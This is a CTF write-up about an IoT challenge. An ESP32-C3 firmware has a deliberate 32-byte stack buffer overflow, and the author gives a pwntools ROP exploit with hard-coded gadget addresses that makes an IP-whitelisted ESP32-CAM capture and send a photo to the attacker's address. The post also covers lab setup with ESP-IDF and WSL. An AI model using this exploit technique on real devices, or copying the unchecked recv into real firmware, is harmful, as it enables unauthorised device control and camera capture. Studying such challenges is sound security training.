---
date: '2025-12-20T21:23:11+07:00'
draft: false
title: 'Introduction to IoT Pwn Using an ESP32 Chip'
---

A while back, my team and I competed in a local CTF which had a dedicated section for IoT challenges in the finals where participants were given actual hardware to tinker with and exploit. Now this was very interesting for me as I've never touched anything hardware CTF related before. The premise for the IoT pwn challenge was that there was a camera connected to the venue's network and each participant was given an ESP32-C3 chip and had to find a way to take a picture with the camera. This may sound a bit abstract as of now, but I'll try to clear things up as this post goes on.

## Challenge Overview
[Download Challenge Files](hunger.zip)

### The Camera
As stated before, there was a single camera (an ESP32-CAM) in the venue and the main goal was that you had to take a picture with it. But what does that even mean exactly? In the challenge files, you'll find a directory called `server-cam`. As the name implies, this is the code running on the ESP32-CAM.

```c++{linenos=true}
// --------- WHITELIST CONFIG (SOURCE IPs ONLY) ----------
IPAddress allowedSources[] = {
    // adjusted for home IP
    IPAddress(192, 168, 0, 135)
};
const int allowedSourcesCount = sizeof(allowedSources) / sizeof(allowedSources[0]);

WiFiServer server(9000);

// --- Helper: Check if the INCOMING IP is in our list ---
bool isSourceAllowed(IPAddress clientIP) {
    for (int i = 0; i < allowedSourcesCount; i++) {
        if (clientIP == allowedSources[i]) {
            return true;
        }
    }
    return false;
}

void handle_client(WiFiClient &client) {
    IPAddress incomingIP = client.remoteIP();
    Serial.printf("Incoming connection from: %s ... ", incomingIP.toString().c_str());

    if (!isSourceAllowed(incomingIP)) {
        Serial.println("DENIED (IP not in whitelist)");
        client.println("ERROR: Access Denied. Your IP is not authorized.");
        client.stop();
        return;
    }
    Serial.println("ALLOWED");

    String line = read_line(client);
    line.trim();
    Serial.printf("Command: '%s'\n", line.c_str());

    if (line.startsWith("SEND_TO ")) {
        int firstSpace = line.indexOf(' ');
        int secondSpace = line.indexOf(' ', firstSpace + 1);

        if (secondSpace == -1) {
            client.println("ERROR: Invalid Format");
            client.stop();
            return;
        }

        String targetIpStr = line.substring(firstSpace + 1, secondSpace);
        String targetPortStr = line.substring(secondSpace + 1);

        IPAddress targetIP;
        if (!targetIP.fromString(targetIpStr)) {
            client.println("ERROR: Invalid Target IP");
            client.stop();
            return;
        }
        int targetPort = targetPortStr.toInt();

        Serial.printf("Authorized request. Preparing to send to Target: %s:%d\n", targetIpStr.c_str(), targetPort);

        camera_fb_t *fb = esp_camera_fb_get();
        if (!fb) {
            Serial.println("Camera capture failed");
            client.println("ERROR: Capture Failed");
            client.stop();
            return;
        }

        String base64Image = base64::encode(fb->buf, fb->len);
        esp_camera_fb_return(fb);

        WiFiClient targetClient;

        if (targetClient.connect(targetIP, targetPort)) {
            targetClient.print("IMG_DATA:");
            targetClient.print(base64Image);
            targetClient.print("\n");
            targetClient.stop();

            Serial.println("Image sent successfully.");
            client.println("OK: Image sent.");
        } else {
            Serial.println("Failed to connect to target.");
            client.println("ERROR: Could not reach target");
        }

    } else {
        client.println("ERROR: Unknown Command");
    }

    client.stop();
}
```

The code basically turns the camera into a server that can accept requests to take pictures. The camera will conenct to the local Wi-Fi and listen in for any incoming connections. The clients who connect to the camera can send a `SEND_TO` command to tell the camera to take a picture. The format of the command is `SEND_TO <recv_ip> <recv_port>`. When the camera receives this command, it'll take a picture, base64 encode it, then send the result back to the specified IP and port.

However, the catch is that not all devices are allowed to ask for pictures. The server has a list of whitelisted IPs that are allowed to issue the `SEND_TO` command. If you send the command from any other device whose IP is not a part of the whitelist, you'll immediately get rejected. So the next question becomes, which devices have these whitelisted IPs?

> **NOTE**: I've adjusted the whitelist of the IP above to match the IP address of my ESP32-C3 at home. Originally, the whitelist contained the IPs of the ESP32-C3's at the event.

### The ESP32-C3 Microcontroller
This was the main piece of hardware that participants could connect to their laptops and play around with. Unlike the ESP32-C3, participants weren't allowed to directly tinker with the camera and were only given the source code running on it. Once you've connected the microcontroller to your laptop and monitored its output, you'll find that this is one of the devices that's allowed to contact the camera.
```console
I (681) wifi:dp: 1, bi: 102400, li: 3, scale listen interval from 307200 us to 307200 us
I (691) wifi:set rx beacon pti, rx_bcn_pti: 0, bcn_timeout: 25000, mt_pti: 0, mt_time: 10000
I (741) wifi:AP's beacon interval = 102400 us, DTIM period = 1
I (1711) esp_netif_handlers: sta ip: 192.168.0.135, mask: 255.255.255.0, gw: 192.168.0.1
I (1711) HUNGER: ------------------------------------------
I (1711) HUNGER: IP: 192.168.0.135
I (1711) HUNGER: Port: 9999
I (1711) HUNGER: ------------------------------------------
I (280731) HUNGER: Client connected
```

The firmware running on the ESP32-C3 is relatively simple. Like the camera, it connects to your local Wi-Fi then loops infinitely to wait for incoming connections. Once a client connects, it can send a string and the ESP32 will log it in its output. That's it.

```c{linenos=true}
static const char* TAG = "HUNGER";

#define WIFI_SSID       "********"
#define WIFI_PASS       "********"
#define PORT            9999

volatile struct sockaddr_in home_base;

void setup_globals() {
    struct sockaddr_in* base = (struct sockaddr_in*)&home_base;

    memset(base, 0, sizeof(home_base));
    base->sin_family = AF_INET;
    base->sin_port = htons(9000);
    inet_pton(AF_INET, "192.168.0.149", &base->sin_addr); // adjusted for home IP
}

__attribute__((used))
int create_connection() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct sockaddr_in* dest = (struct sockaddr_in*)&home_base;
    int err = connect(sock, (struct sockaddr*)dest, sizeof(struct sockaddr_in));

    if (err != 0) {
        ESP_LOGE(TAG, "Connect failed");
        close(sock);
        return -1;
    }

    return sock;
}

void hangry(int sock) {
    char buffer[32];

    recv(sock, buffer, 512, 0);

    ESP_LOGI("VULN", "You said: %s", buffer);
}

void hungry(int sock) {
    setup_globals();

    char msg[] = "Call home if you want the flag.\n";
    send(sock, msg, strlen(msg), 0);

    hangry(sock);

    char bye[] = "Goodbye.\n";
    send(sock, bye, strlen(bye), 0);
}

void app_main(void) {
    wifi_init_sta();

    volatile int force_link = 0;
    if (force_link) {
        create_connection();
        connect(0, NULL, 0);
    }

    xTaskCreate(server_task, "svr", 8192, NULL, 5, NULL);
}
```
The vulnerabliity is relatively simple as well. There's a buffer overflow in the `hangry` function caused by the program allowing inputs up to 512 bytes in length, but only having a 32-byte buffer to store it into.

The interesting thing to note here is there's a function to create a connection to `192.168.0.149`, which is the IP address of the camera. However, this function is never called and there's also no code to send a `SEND_TO` command to that IP. So, this leads us to the following exploitation idea: Use the buffer overflow to make a ROP chain that calls `create_connection()`, then calls `send(camera_fd, "SEND_TO [your_ip] [your_port]", len)`.

> **NOTE**: Like before, I've adjusted the IP to match the IP my camera had in my home.

## Setting up the Local Environment
If you'd like to try this challenge yourself at home, the hardware used were the ESP32-CAM for the camera and the ESP32-C3 Super Mini for the microcontroller.

### The Camera
For the camera, I used this [tutorial](https://randomnerdtutorials.com/esp32-cam-video-streaming-face-recognition-arduino-ide/) to get things up and running. After you've installed Arduino IDE and the ESP32 add-on, you can copy and paste the `server-cam.ino` code into a new sketch, then upload it to your ESP32-CAM. Don't forget to change Wi-Fi config and whitelist configs accordingly.

### The ESP32-C3 Microcontroller
The main goal of this part is for you to be able to build and flash code to your ESP32, then debug and monitor the firmware. To do so, you'll need the Espressif IoT Development Framework (ESP-IDF), which you can install by following the steps [here](https://docs.espressif.com/projects/esp-idf/en/stable/esp32/get-started/linux-macos-setup.html).

The TL;DR version:
#### Install esp-idf
```bash
mkdir -p ~/esp
cd ~/esp
git clone --recursive https://github.com/espressif/esp-idf.git
cd esp-idf
./install.sh
source ~/esp/esp-idf/export.sh
```
#### To Debug
```bash
idf.py monitor
idf.py openocd
idf.py gdb
```
#### To Build
```bash
idf.py set-target esp32c3
idf.py build 
```

#### To Flash
```bash
idf.py flash
```

### For WSL Users
If you use WSL and would like to use it as your main development environment, you have to make WSL be able to see your USB devices that are plugged into Windows, which includes your ESP32-C3. To do so, you'll need `usbipd-win` which is a tool that enables sharing locally connected USB devices over a network, primarily to Linux environments like WSL2.

On Windows, install `usbipd-win`:
```powershell
winget install usbipd
```

Then, run `usbipd list` to see your connected devices.

On WSL, run
```bash
sudo apt install linux-tools-virtual hwdata
```

Then, using an elevated PowerShell instance, run
```
usbipd bind -b <busid>
usbipd attach --wsl -b <busid>
```

Going back to WSL, run `lsusb`. You should see your ESP32-C3 listed.

> **NOTE**: The first time I connected the ESP32-C3 to Windows, it would not stop disconnecting then reconnecting over and over. I fixed it by holding the BOOT button on the chip, then pressing RST while still holding BOOT.

## The Exploit
Once you've got everything set up, in seperate terminals, run `idf.py monitor`, `idf.py openocd`, then finally `idf.py gdb`. This should allow you to see the output of the firmware while also allowing you to attach GDB to it.

> **NOTE**: Since I already had pwndbg installed on my WSL but didn't want to use it while debugging, I ran the debugger with `idf.py gdb --gdb-commands="--nx"` to run vanilla GDB.

TL;DR: Make a ROP chain to call the `create_connection()` function and take note of the resuting camera socket fd. Then, call `lwip_send(camera_fd, 'SEND_TO 192.168.0.112 9998', 255)`.

> **TODO**: Create more detailed steps

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './challenge/build/challenge.elf')

host = args.HOST or '192.168.0.135'
port = int(args.PORT or 9999)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

payload = flat({
    0x28: 0x37,
    0x2c: 0x4200a016, # create_connection + 6
    0x3c: 0x4209255c, # load a0 and a1
    0x48: 0x38, # camera fd
    0x4c: 0x3fcad540, # buffer containing the payload to send to camera
    0x5c: 0x4201093c, # li a2, 255
    0x6c: 0x42013516, # lwip_send + 6
    0xb0: b'SEND_TO 192.168.0.112 9998\n\0',
})
log.info(f'{hex(len(payload)) = }')
io.sendafter(b'flag.\n', payload)

io.interactive()

```
